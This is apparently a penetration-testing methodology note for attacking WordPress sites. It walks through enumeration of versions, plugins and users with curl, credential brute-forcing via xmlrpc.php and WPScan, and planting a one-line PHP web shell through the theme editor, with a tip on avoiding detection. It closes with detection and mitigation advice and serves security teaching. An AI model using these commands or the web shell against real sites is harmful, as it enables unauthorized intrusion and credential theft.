#Status/In-Progress #Type/Technique #Context/Redteam #Context/Web #publish-me

---
## Overview
WordPress attacks follow a natural progression from passive reconnaissance through active enumeration to exploitation. Because most WordPress vulnerabilities live in plugins and themes rather than the core, the goal of enumeration is to identify installed extensions and their versions, then match them against known CVEs. With enough access, WordPress provides multiple paths to remote code execution — from vulnerable plugins to the built-in theme editor.

---
## When To Use
- Target is running a WordPress-based website
- Performing web application penetration testing or CTF web challenge
- Looking for an initial foothold on a server hosting WordPress

## Requirements
- HTTP access to the WordPress installation
- [[WPScan]] for automated enumeration and brute-force (optional but recommended)
- [[curl]] for manual enumeration
- Administrator credentials for exploitation via theme editor

---
## Attack Steps

### Phase 1 — Version Enumeration
Knowing the WordPress version helps identify applicable CVEs and core vulnerabilities.

Check the page source meta tag: `View Source → search for <meta name="generator"`

Via curl:
`curl -s -X GET http://<target> | grep '<meta name="generator"'`

Older WordPress installations expose version in `readme.html` at the site root:
`curl -s http://<target>/readme.html | grep -i version`

CSS and JS links in page source often include version numbers as query parameters (e.g., `?ver=5.8.1`).

### Phase 2 — Plugin and Theme Enumeration
Plugins and themes are the primary attack surface. Extract references from page source:

Plugins:
`curl -s -X GET http://<target> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2`

Themes:
`curl -s -X GET http://<target> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2`

Response headers may also contain version numbers for specific plugins. Not all installed plugins are visible passively — use [[WPScan]] for aggressive enumeration to find hidden ones.

### Phase 3 — Directory Indexing Check
Deactivated plugins may still be accessible via their directory. Even disabled plugins can contain exploitable code:

`curl -s -X GET http://<target>/wp-content/plugins/<plugin-name>/ | html2text`

A 200 response with file listings confirms directory indexing is enabled. A 403 means indexing is disabled but the directory exists. A 404 means the plugin is not installed.

### Phase 4 — User Enumeration
Valid usernames are required for brute-force attacks. Two reliable methods:

**Method 1 — Author ID URL:**
Browse to `http://<target>/?author=1`, `?author=2`, etc. WordPress redirects to the author archive page revealing the username in the URL. With curl:
`curl -s -I http://<target>/?author=1`
Check the `Location:` header in the response for the username.

**Method 2 — JSON REST API** (WordPress ≥ 4.7.1):
`curl http://<target>/wp-json/wp/v2/users | jq`
Returns a JSON array of all publicly registered users with usernames, display names, and avatars.

### Phase 5 — Login and Credential Attacks
With valid usernames, attempt authentication via the login page or `xmlrpc.php`.

**xmlrpc.php manual test** — verify credentials against the XML-RPC endpoint:
`curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><username></value></param><param><value><password></value></param></params></methodCall>" http://<target>/xmlrpc.php`
A 200 response with blog details confirms valid credentials. A 403 indicates invalid credentials.

List available xmlrpc methods on the target:
`curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://<target>/xmlrpc.php | egrep "<value><string>"`

**WPScan brute force** — automate credential testing via xmlrpc or wp-login:
`wpscan --password-attack xmlrpc -t 20 -U <user1>,<user2> -P <wordlist.txt> --url http://<target>`

See [[WPScan]] for full brute-force flag reference.

### Phase 6 — Exploiting a Vulnerable Plugin
WPScan reports include direct links to CVE PoCs for any vulnerable plugin or theme versions detected. Follow the PoC steps for each finding. Common vulnerability classes include:
- Unauthenticated SQL injection
- Local/remote file inclusion (LFI/RFI)
- Arbitrary file upload
- Cross-site scripting (XSS) leading to admin takeover
- Authentication bypass

Search Metasploit for WordPress-specific modules: `search wordpress <plugin-name>`

### Phase 7 — RCE via Theme Editor (Requires Admin)
With Administrator credentials, WordPress's built-in theme editor allows direct PHP file modification — providing immediate remote code execution.

Steps:
1. Log in to the WordPress admin panel (`/wp-admin/`)
2. Navigate to **Appearance → Theme Editor**
3. Select an **inactive theme** (editing the active theme risks breaking the site and triggering detection)
4. Open a non-critical PHP file (e.g., `404.php`)
5. Inject a PHP web shell at the top of the file:

```php
<?php system($_GET['cmd']); ?>
```

6. Save changes
7. Trigger execution via curl:
`curl -X GET "http://<target>/wp-content/themes/<inactive-theme>/404.php?cmd=id"`

Replace `id` with any system command. Upgrade to a full reverse shell from here.

---
## Detection
- High volume of POST requests to `xmlrpc.php` or `wp-login.php` — indicates brute force
- Requests to `?author=<number>` across multiple IDs in rapid succession — user enumeration
- Access to `/wp-json/wp/v2/users` from external IPs — automated user harvesting
- Unexpected PHP file modifications in theme or plugin directories — theme editor RCE
- New admin accounts created without change management records
- Unusual outbound connections from the web server process (`www-data`) — reverse shell establishment

## Mitigation
- Disable xmlrpc.php if not in use (block via `.htaccess` or Nginx config)
- Block or rate-limit requests to `wp-login.php`
- Disable the REST API for unauthenticated users if user enumeration is a concern
- Restrict the Theme Editor to trusted admins only or disable it via `wp-config.php`: `define('DISALLOW_FILE_EDIT', true);`
- Enable a WAF (Wordfence, Sucuri) with brute-force protection enabled
- Monitor file integrity with a plugin like Sucuri or iThemes Security

---
## Related Knowledge
- [[WordPress]]
- [[Website Innerworkings]]
- [[OWASP Top 10 - 2021]]

## Related Playbook
- [[Linux Pentest Playbook]]

## Related Tools
- [[WPScan]]
- [[curl]]
- [[MSFConsole]]

---
## References / Images
- https://github.com/wpscanteam/wpscan
- https://wordpress.org/plugins/wordfence/
